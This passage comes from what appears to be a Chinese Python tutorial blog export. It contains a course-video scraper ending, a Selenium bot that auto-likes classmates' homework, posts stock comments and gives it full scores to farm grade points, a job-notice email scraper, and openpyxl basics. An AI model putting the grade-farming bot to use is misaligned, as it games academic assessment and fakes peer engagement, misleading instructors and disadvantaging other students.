class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有了这个程序模板，只要把url_course换成你自己的课程url，就可以爬取到全部的视频，按理说应该可以爬取任意的课程视频了，我又用这个程序取爬取了另外一门课程的视频，实测是没问题的。<br>就是注意一点，如果用于盈利的话，就涉及侵权，侵权违法，不要说是我教的。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 项目教学 </tag>
            
            <tag> 网络爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python网络爬虫2—网课自动刷点赞刷评论刷积分</title>
      <link href="/2022/03/19/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB2%E2%80%94%E7%BD%91%E8%AF%BE%E8%87%AA%E5%8A%A8%E5%88%B7%E7%82%B9%E8%B5%9E%E5%88%B7%E8%AF%84%E8%AE%BA%E5%88%B7%E7%A7%AF%E5%88%86/"/>
      <url>/2022/03/19/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB2%E2%80%94%E7%BD%91%E8%AF%BE%E8%87%AA%E5%8A%A8%E5%88%B7%E7%82%B9%E8%B5%9E%E5%88%B7%E8%AF%84%E8%AE%BA%E5%88%B7%E7%A7%AF%E5%88%86/</url>
      
        <content type="html"><![CDATA[<p>疫情期间上网课，学校使用UMN教学平台进行授课，点赞和评论都可以获得积分，积分影响最终成绩，别的同学都是手动弄，我觉得太麻烦，所以我打算用Python刷一刷。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#2.2版本公告：新增账号保存功能，用户只需要输入一次账号密码，会自动以文本格式保存在当前文件夹下，第二次运行会自动读取</span><span class="token comment">#2.1版本公告：程序通过相对路径找到chromedriver.exe，不需要用户再手动填写绝对路径了</span><span class="token comment">#2.0版本公告：加入自动评分和评论的功能，加入可显示剩余人数的功能</span><span class="token comment">#1.7版本公告：做了代码优化，并封装了部分复用的代码</span><span class="token comment">#1.6版本公告：加入了用户自定义输入，可自定义评论内容</span><span class="token comment">#1.5版本公告：修复了因找不到chromedriver而造成的'chromedriver' executable needs  to be in PATH的bug</span><span class="token comment">#1.4版本公告：修复因跳过页面展开而造成的实际人数统计的错误，加入了页面滑动以及显性等待机制，最长等待20秒</span><span class="token comment">#1.3版本公告：修复一处因服务器排队而造成的程序无法运行的bug，加入了3分钟的页面隐性等待</span><span class="token comment">#1.2版本公告：修复一处在展开页面时，因为网络不稳定而造成的list index out of range的bug，加入了异常跳过机制</span><span class="token comment">#1.1版本公告：修复一处因页面返回而导致的实际点赞人数不足的bug，在页面返回时需重新展开所有作业名单</span><span class="token comment">#unm自动点赞器1.0功能介绍：用于在unm平台实现对其他同学作业的自动点赞。</span><span class="token keyword">import</span> time<span class="token punctuation">,</span>pyautogui<span class="token punctuation">,</span>openpyxl<span class="token punctuation">,</span>os<span class="token keyword">from</span> selenium <span class="token keyword">import</span> webdriver<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>common<span class="token punctuation">.</span>keys <span class="token keyword">import</span> Keys<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>common<span class="token punctuation">.</span>by <span class="token keyword">import</span> By<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>support<span class="token punctuation">.</span>ui <span class="token keyword">import</span> WebDriverWait<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>support <span class="token keyword">import</span> expected_conditions <span class="token keyword">as</span> EC<span class="token keyword">def</span> <span class="token function">look_all_task</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#----展开所有作业名单----#</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            pyautogui<span class="token punctuation">.</span>scroll<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">10000</span><span class="token punctuation">)</span>            more <span class="token operator">=</span> WebDriverWait<span class="token punctuation">(</span>driver<span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">.</span>until<span class="token punctuation">(</span>EC<span class="token punctuation">.</span>presence_of_element_located<span class="token punctuation">(</span><span class="token punctuation">(</span>By<span class="token punctuation">.</span>CLASS_NAME<span class="token punctuation">,</span><span class="token string">"btn-inner"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            driver<span class="token punctuation">.</span>execute_script<span class="token punctuation">(</span><span class="token string">"arguments[0].click();"</span><span class="token punctuation">,</span>more<span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'跳过因为网络不稳定展开页面失败而造成的list index out of range问题'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">account_save</span><span class="token punctuation">(</span>user_acount<span class="token punctuation">,</span>user_password<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#----保存用户账号密码信息----#</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>account_path<span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span><span class="token punctuation">[</span>user_acount<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">,</span>user_password<span class="token punctuation">]</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">account_load</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#----读取用户账号密码信息----#</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>account_path<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f_content<span class="token operator">=</span>f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> f_content<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>f_content<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment">#----用户自定义输入----#</span>    base_dir <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span>  <span class="token comment">#获取当前文件夹的绝对路径</span>    account_path<span class="token operator">=</span>base_dir<span class="token operator">+</span><span class="token string">"//account.txt"</span>    user_comment<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入你要评论的内容，（样例：你的作业做得真好，非常优秀）：'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>account_path<span class="token punctuation">)</span><span class="token punctuation">:</span>        user_acount<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入你的umn账号:'</span><span class="token punctuation">)</span>        user_password<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入你的umn密码:'</span><span class="token punctuation">)</span>        account_save<span class="token punctuation">(</span>user_acount<span class="token punctuation">,</span>user_password<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        user_acount<span class="token punctuation">,</span>user_password<span class="token operator">=</span>account_load<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#----登录网站----#</span>    url_task<span class="token operator">=</span><span class="token string">'https://m.umu.cn/session/exercise/?surl=1SqbQ623d'</span>    url<span class="token operator">=</span><span class="token string">'https://www.umu.cn/index#/index'</span>    driver<span class="token operator">=</span>webdriver<span class="token punctuation">.</span>Chrome<span class="token punctuation">(</span>executable_path<span class="token operator">=</span><span class="token string">'chromedriver.exe'</span><span class="token punctuation">)</span>    <span class="token comment"># driver=webdriver.Chrome()</span>    driver<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    driver<span class="token punctuation">.</span>implicitly_wait<span class="token punctuation">(</span><span class="token number">180</span><span class="token punctuation">)</span> <span class="token comment">#隐式等待，最长等待180秒</span>    account<span class="token operator">=</span>driver<span class="token punctuation">.</span>find_elements_by_class_name<span class="token punctuation">(</span><span class="token string">'input-text'</span><span class="token punctuation">)</span>    account<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span>user_acount<span class="token punctuation">)</span>    account<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span>user_password<span class="token punctuation">)</span>    button<span class="token operator">=</span>driver<span class="token punctuation">.</span>find_element_by_class_name<span class="token punctuation">(</span><span class="token string">'btn-warning'</span><span class="token punctuation">)</span>    button<span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token comment">#----转到作业二的界面----#</span>    driver<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url_task<span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    look_all_task<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#----统计任务数----#</span>    look_task<span class="token operator">=</span>driver<span class="token punctuation">.</span>find_elements_by_class_name<span class="token punctuation">(</span><span class="token string">'review-status'</span><span class="token punctuation">)</span>    surplus<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>look_task<span class="token punctuation">)</span>    <span class="token comment">#----进入个人作业详情页----#</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        look_task<span class="token operator">=</span>driver<span class="token punctuation">.</span>find_elements_by_class_name<span class="token punctuation">(</span><span class="token string">'review-status'</span><span class="token punctuation">)</span>        driver<span class="token punctuation">.</span>execute_script<span class="token punctuation">(</span><span class="token string">"arguments[0].click();"</span><span class="token punctuation">,</span>look_task<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>        driver<span class="token punctuation">.</span>implicitly_wait<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>        <span class="token comment">#----点赞----#</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            like<span class="token operator">=</span>driver<span class="token punctuation">.</span>find_element_by_class_name<span class="token punctuation">(</span><span class="token string">'liked-user-prise'</span><span class="token punctuation">)</span>            driver<span class="token punctuation">.</span>execute_script<span class="token punctuation">(</span><span class="token string">"arguments[0].click();"</span><span class="token punctuation">,</span>like<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'点赞成功'</span><span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'没有找到点赞功能'</span><span class="token punctuation">)</span>        <span class="token comment">#----评论打分----#</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            comment_button <span class="token operator">=</span> driver<span class="token punctuation">.</span>find_element_by_class_name<span class="token punctuation">(</span><span class="token string">'do-score'</span><span class="token punctuation">)</span>            pyautogui<span class="token punctuation">.</span>scroll<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1000</span><span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>            comment_button<span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>            score<span class="token operator">=</span>driver<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">'/html/body/div[2]/div/div[2]/div/div/div/div[2]/div/div/div/div[2]/div[1]/div/input'</span><span class="token punctuation">)</span>            score<span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span><span class="token string">'100'</span><span class="token punctuation">)</span>            comment<span class="token operator">=</span>driver<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">'/html/body/div[2]/div/div[2]/div/div/div/div[2]/div/div/div/div[3]/div/textarea'</span><span class="token punctuation">)</span>            comment<span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span>user_comment<span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>            submit<span class="token operator">=</span>driver<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">'/html/body/div[2]/div/div[2]/div/div/div/div[1]/div/span[2]/span'</span><span class="token punctuation">)</span>            submit<span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'评论成功'</span><span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'读取标签失败'</span><span class="token punctuation">)</span>        surplus<span class="token operator">-=</span><span class="token number">1</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'剩余'</span><span class="token punctuation">,</span>surplus<span class="token punctuation">)</span>        <span class="token comment">#----转到作业二的界面并展开作业列表----#</span>        driver<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url_task<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>        driver<span class="token punctuation">.</span>implicitly_wait<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>         look_all_task<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>总结：这种程序实际上是模仿浏览器进行操作，很难防范，可造成的危害也比较有限，纯属娱乐性质。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 项目教学 </tag>
            
            <tag> 网络爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python爬虫项目一—消息通知器</title>
      <link href="/2022/03/18/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB1%E2%80%94%E6%B6%88%E6%81%AF%E9%80%9A%E7%9F%A5%E5%99%A8/"/>
      <url>/2022/03/18/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB1%E2%80%94%E6%B6%88%E6%81%AF%E9%80%9A%E7%9F%A5%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="一、制作背景"><a href="#一、制作背景" class="headerlink" title="一、制作背景"></a>一、制作背景</h2><p>如果要应聘某个单位，但是不知道这个单位什么时候发布招聘信息，总不能天天上官网去看吧，对于我这样孤僻的性格，消息闭塞，很有可能错过重要的招聘信息。<br>因此，我需要一个程序可以自动爬取网站的消息栏，如果发现有自己关注的信息，则发一封邮件给自己。<br>例如海盐商贸学校发布了一条招聘计算机教师的通知，我需要第一时间得到通知。</p><h2 id="二、代码分享"><a href="#二、代码分享" class="headerlink" title="二、代码分享"></a>二、代码分享</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> smtplib<span class="token keyword">import</span> schedule<span class="token keyword">import</span> time<span class="token punctuation">,</span>os<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">from</span> email<span class="token punctuation">.</span>mime<span class="token punctuation">.</span>text <span class="token keyword">import</span> MIMEText<span class="token keyword">from</span> email<span class="token punctuation">.</span>header <span class="token keyword">import</span> Header <span class="token keyword">def</span> <span class="token function">account_save</span><span class="token punctuation">(</span>keyword<span class="token punctuation">,</span>qqmail<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#----保存用户邮箱和关键词信息----#</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>account_path<span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span><span class="token punctuation">[</span>keyword<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">,</span>qqmail<span class="token punctuation">]</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">account_load</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#----读取邮箱和关键词信息----#</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>account_path<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f_content<span class="token operator">=</span>f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> f_content<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>f_content<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">def</span> <span class="token function">YanGongBu_spider</span><span class="token punctuation">(</span>keyword<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#----爬取研工部通知栏前三项----#</span>    headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'user-agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'</span><span class="token punctuation">}</span>    url<span class="token operator">=</span><span class="token string">'http://yjsb.zjnu.edu.cn/'</span>    res<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    soup<span class="token operator">=</span>BeautifulSoup<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">,</span><span class="token string">'html.parser'</span><span class="token punctuation">)</span>    titles<span class="token operator">=</span>soup<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'span'</span><span class="token punctuation">,</span>class_<span class="token operator">=</span><span class="token string">"meta-title"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> title <span class="token keyword">in</span> titles<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> keyword <span class="token keyword">in</span> title<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            send_email<span class="token punctuation">(</span>title<span class="token punctuation">.</span>text<span class="token punctuation">,</span>qqmail<span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">send_email</span><span class="token punctuation">(</span>title<span class="token punctuation">,</span>qqmail<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#----使用710464440代发邮件----#</span>    account<span class="token operator">=</span>qqmail    password<span class="token operator">=</span><span class="token string">'这里填写邮箱密码'</span>    reveiver<span class="token operator">=</span><span class="token string">'710464440@qq.com'</span>    mailhost<span class="token operator">=</span><span class="token string">'smtp.qq.com'</span>    qqmail<span class="token operator">=</span>smtplib<span class="token punctuation">.</span>SMTP<span class="token punctuation">(</span><span class="token punctuation">)</span>    qqmail<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>mailhost<span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">)</span>    qqmail<span class="token punctuation">.</span>login<span class="token punctuation">(</span>account<span class="token punctuation">,</span>password<span class="token punctuation">)</span>    content<span class="token operator">=</span>title    massage<span class="token operator">=</span>MIMEText<span class="token punctuation">(</span>content<span class="token punctuation">,</span><span class="token string">"plain"</span><span class="token punctuation">,</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>    subject<span class="token operator">=</span><span class="token string">'研工部通知'</span>    massage<span class="token punctuation">[</span><span class="token string">'Subject'</span><span class="token punctuation">]</span><span class="token operator">=</span>Header<span class="token punctuation">(</span>subject<span class="token punctuation">,</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        qqmail<span class="token punctuation">.</span>sendmail<span class="token punctuation">(</span>account<span class="token punctuation">,</span>reveiver<span class="token punctuation">,</span>massage<span class="token punctuation">.</span>as_string<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'邮件发送成功'</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'邮件发送失败'</span><span class="token punctuation">)</span>    qqmail<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    base_dir <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span>  <span class="token comment">#获取当前文件夹的绝对路径</span>    account_path<span class="token operator">=</span>base_dir<span class="token operator">+</span><span class="token string">"/account.txt"</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>account_path<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>account_path<span class="token punctuation">)</span><span class="token punctuation">:</span>        keyword<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入你想关注的内容的关键词(例如：招聘)：'</span><span class="token punctuation">)</span>        qqmail<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入你的qq邮箱地址(例如：715555555@qq.com)："</span><span class="token punctuation">)</span>        account_save<span class="token punctuation">(</span>keyword<span class="token punctuation">,</span>qqmail<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        keyword<span class="token punctuation">,</span>qqmail<span class="token operator">=</span>account_load<span class="token punctuation">(</span><span class="token punctuation">)</span>    YanGongBu_spider<span class="token punctuation">(</span>keyword<span class="token punctuation">)</span>    <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'按任意键退出程序'</span><span class="token punctuation">)</span> <span class="token comment">#这段代码用于挂远程服务器</span><span class="token comment">#schedule.every().day.at('17:30').do(YanGongBu_spider)</span><span class="token comment">#while True:</span>    <span class="token comment">#schedule.run_pending()</span>    <span class="token comment">#time.sleep(1)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、使用小tip"><a href="#三、使用小tip" class="headerlink" title="三、使用小tip"></a>三、使用小tip</h2><p>如果是本地使用的话，利用windows的任务计划程序，每天定时运行程序，如果那个时间电脑没开，程序则不会运行，而且如果在玩游戏，可能会被黑窗口弹一下，比较影响体验。<br>因此，我们需要将代码挂在远程的服务器上，服务器24小时运行，完美解决问题。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 项目教学 </tag>
            
            <tag> 网络爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python数据分析3—openpyxl</title>
      <link href="/2022/03/17/Python%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%903%E2%80%94openpyxl%E5%BA%93/"/>
      <url>/2022/03/17/Python%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%903%E2%80%94openpyxl%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h2 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h2><h3 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h3><p>openpyxl是用来处理Excel电子表格的Python第三方库，使用前需要现安装，<code>pip install openpyxl</code></p><h3 id="2-新建工作簿"><a href="#2-新建工作簿" class="headerlink" title="2.新建工作簿"></a>2.新建工作簿</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> Workbook<span class="token comment"># 新建工作簿</span>new_wb <span class="token operator">=</span> Workbook<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 将新建的工作簿保存为【新的Excel工作表.xlsx】</span>new_wb<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'./新的Excel工作表.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-读取工作簿"><a href="#3-读取工作簿" class="headerlink" title="3.读取工作簿"></a>3.读取工作簿</h3><ol><li><code>openpyxl.load_workbook()</code>可读取工作簿对象。</li><li>**工作簿对象[‘工作表’]**可读取工作表。</li><li>**工作表对象[行数]<strong>、</strong>工作表对象[‘列名’]**可读取行和列，得到一个元祖。</li><li>**工作表对象[行列]**得到一个单元格对象<code>Cell</code>。</li><li><strong>单元格对象.value</strong>得到这个单元格对象具体的值。<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbook<span class="token comment"># 打开【21计3成绩表.xlsx】工作簿</span>wb <span class="token operator">=</span> load_workbook<span class="token punctuation">(</span><span class="token string">'./Python成绩表.xlsx'</span><span class="token punctuation">)</span><span class="token comment"># 获取【'21计3'】工作表</span>ws_21J3 <span class="token operator">=</span> wb<span class="token punctuation">[</span><span class="token string">'21计3'</span><span class="token punctuation">]</span><span class="token comment"># 循环打印出第2行所有单元格的值</span><span class="token keyword">for</span> cell_2 <span class="token keyword">in</span> ws_21J3<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>cell_2<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token comment"># 循环打印出第2列（B列）所有单元格的值</span><span class="token keyword">for</span> cell_B <span class="token keyword">in</span> ws_21J3<span class="token punctuation">[</span><span class="token string">'B'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>cell_B<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token comment"># 